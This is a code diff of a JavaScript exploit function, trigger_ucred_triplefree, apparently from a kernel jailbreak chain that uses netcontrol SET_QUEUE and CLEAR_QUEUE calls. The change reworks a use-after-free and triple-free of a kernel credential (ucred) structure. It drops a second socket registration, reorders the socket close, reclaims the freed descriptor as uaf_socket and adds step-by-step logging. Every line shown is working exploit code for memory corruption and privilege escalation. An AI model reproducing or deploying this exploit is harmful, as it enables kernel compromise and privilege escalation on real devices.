@@ -1437,32 +1437,33 @@ function trigger_ucred_triplefree() {
     main_count++;
 
     // 1) dummy socket → register in netcontrol
-    var dummy_socketA = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socketA.and(0xFFFFFFFF)));
+    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    log("[+] dummy_socket opened → FD = " + dummy_socket);
+
+    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+    log("[+] SET_QUEUE buffer prepared with FD = " + dummy_socket);
+
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    close(new BigInt(dummy_socketA));
+    log("[+] netcontrol SET_QUEUE sent");
 
     // 2) allocate new ucred
     setuid(1);
+    log("[+] setuid(1) → new ucred allocated");
 
-    // 1) dummy socket → register in netcontrol
-    var dummy_socketB = socket(AF_UNIX, SOCK_STREAM, 0);
-    write32(nc_set_buf, Number(dummy_socketB.and(0xFFFFFFFF)));
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    close(new BigInt(dummy_socketB));
-
-    // 2) allocate new ucred
-    setuid(1);
+    // close dummy socket
+    close(new BigInt(dummy_socket));
+    log("[+] dummy_socket closed → FD freed");
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
+    log("[+] uaf_socket opened → FD = " + uaf_socket);
 
-    // 4) free previous ucred
-    setuid(1);
-
-    // 5) unregister → free file + ucred
+    // 4) unregister → free file + ucred
     write32(nc_clear_buf, uaf_socket);
+    log("[+] CLEAR_QUEUE buffer prepared with FD = " + uaf_socket);
+
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
+    log("[+] netcontrol CLEAR_QUEUE sent");
 
     // 6) refcount fix loop
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
